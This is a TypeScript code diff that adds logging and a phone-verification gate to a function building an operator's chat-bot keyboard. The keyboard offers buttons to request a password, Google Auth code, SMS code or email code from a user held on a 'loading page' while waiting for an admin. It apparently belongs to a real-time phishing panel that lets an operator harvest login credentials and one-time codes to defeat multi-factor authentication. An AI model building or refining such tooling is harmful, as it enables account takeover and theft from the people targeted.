@@ -351,8 +351,22 @@ const formatInitialMessage = (session: UserSession): string => {
  * Get admin keyboard based on session state
  */
 const getAdminKeyboard = (sessionId: string, session: UserSession) => {
-  // Only show buttons if user is on loading page
+  console.log("🎛️ Building admin keyboard for session:", {
+    sessionId,
+    currentStep: session.currentStep,
+    completedSteps: session.completedSteps,
+    authAttempts: session.authAttempts,
+  });
+
+  // Only show buttons if user is on loading page AND has completed phone verification
   if (session.currentStep !== "waiting_admin") {
+    console.log("❌ Not showing buttons - wrong step:", session.currentStep);
+    return { inline_keyboard: [] };
+  }
+
+  // User must have completed phone verification to see admin buttons
+  if (!session.completedSteps.includes("phone_verification")) {
+    console.log("❌ Not showing buttons - phone verification not completed");
     return { inline_keyboard: [] };
   }
 
@@ -366,6 +380,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
         callback_data: `auth_password_${sessionId}`,
       },
     ]);
+    console.log("✅ Added Password button");
   }
 
   // Google Auth button
@@ -376,6 +391,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
         callback_data: `auth_google_${sessionId}`,
       },
     ]);
+    console.log("✅ Added Google Auth button");
   }
 
   // SMS Code button (allow up to 2 attempts)
@@ -386,6 +402,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
         callback_data: `auth_sms_${sessionId}`,
       },
     ]);
+    console.log("✅ Added SMS Code button");
   }
 
   // Email Code button
@@ -396,6 +413,7 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
         callback_data: `auth_email_${sessionId}`,
       },
     ]);
+    console.log("✅ Added Email Code button");
   }
 
   // Complete Auth button (if user has completed at least one additional step)
@@ -406,8 +424,10 @@ const getAdminKeyboard = (sessionId: string, session: UserSession) => {
         callback_data: `complete_auth_${sessionId}`,
       },
     ]);
+    console.log("✅ Added Complete Auth button");
   }
 
+  console.log("🎛️ Final keyboard:", { inline_keyboard: buttons });
   return { inline_keyboard: buttons };
 };
 
